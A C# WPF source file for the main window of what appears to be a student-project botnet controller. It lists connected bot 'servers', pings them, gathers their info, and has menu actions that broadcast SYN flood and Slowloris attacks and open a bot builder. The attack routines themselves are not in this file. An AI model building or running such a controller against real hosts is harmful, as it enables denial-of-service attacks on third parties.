using Client.Helpers;
using Client.Models;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Client
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {   
        ConnectionManager Connections = new ConnectionManager();
        int TotalServersConnected = 0;

        List<Server> items { get; set; }

        AttackWindow _attackWindow { get; set; }
        ServerBuilder _serverBuilder { get; set; }
        public MainWindow()
        {
            InitializeComponent();

            Title = "EPL 606 - Client";

            //Setup Item source for thhe listview
            lvServers.ItemsSource = items = new List<Server>();

            //Register for Server notifications
            Connections.OnServerChange += OnServersChange;
            Connections.OnResponceReceived += OnResponceReceived;

        }

        private void OnResponceReceived(object sender, Responce e)
        {
            switch(e.Code)
            {
                case "Ping":
                    UpdatePing(e);
                    break;

                case "Request Info":
                    UpdateInfo(e);
                    break;


                default:
                    break;
            }
        }
        private void UpdateInfo(Responce responce)
        {
            Application.Current.Dispatcher.Invoke(new Action(() =>
            {

                var match = items.SingleOrDefault(x => x.Id == responce.SockId);

                String Info = responce.Data.First() as String;
                String RemoteIP = responce.Data[1] as String;

                match.ComputerId = Info;
                match.IP = RemoteIP;
                lvServers.Items.Refresh();

            }));
        
        }
        private void UpdatePing(Responce responce)
        {
            Application.Current.Dispatcher.Invoke(new Action(() =>
            {
                var match = items.SingleOrDefault(x => x.Id == responce.SockId);

                double? lag = responce.Data.First() as double?;
                match.Lag = (int)lag;
                lvServers.Items.Refresh();

            }));

        }

        private void OnServersChange(object sender, ConnectionEventArgs e)
        {

            if (Application.Current == null)
                return;

            if(e.ConnectionType == 0)
                Application.Current.Dispatcher.Invoke(new Action(() => { AddServerToList(e); }));             //Add to our ListView
            else
                Application.Current.Dispatcher.Invoke(new Action(() => { RemoveServerFromList(e); }));            //Remove from list
        }

        private void AddServerToList(ConnectionEventArgs e)
        {
            if (e.Id == Guid.Empty)
                return;

            items.Add(new Server() { No = TotalServersConnected, Id = e.Id, IP = e.RemoteIp });
            lvServers.Items.Refresh();

            TotalServersConnected++;
        }

        private void RemoveServerFromList(ConnectionEventArgs e)
        {
            if (e.Id == Guid.Empty)
                return;

            var match = items.SingleOrDefault(x=>x.Id == e.Id);

            if (match == null)
                return;

            items.Remove(match);
            lvServers.Items.Refresh();
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            //Close all Sockets upon client exit
            Connections.CloseAllSockets();
        }

        private void SynFloodItem_Click(object sender, RoutedEventArgs e)
        {
            _attackWindow = new AttackWindow(Connections,1,"Broadcast SYN Flood Attack");
            _attackWindow.Owner = this;

            if(_attackWindow.ShowDialog() == true)
            {
               // Broadcast Window closed
            }

        }

        private void SlowlorisItem_Click(object sender, RoutedEventArgs e)
        {
            _attackWindow = new AttackWindow(Connections, 2, "Broadcast Slowloris Attack");
            _attackWindow.Owner = this;

            if (_attackWindow.ShowDialog() == true)
            {
                // Broadcast Attack Window closed
            }

        }
        private void ServerBuilderItem_Click(object sender, RoutedEventArgs e)
        {
            _serverBuilder = new ServerBuilder();
            _serverBuilder.Owner = this;

            if (_serverBuilder.ShowDialog() == true)
            {
                // Server Window closed
            }
        
        }
        private void ExitItem_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();

        }
        
        
       

       
    }
}
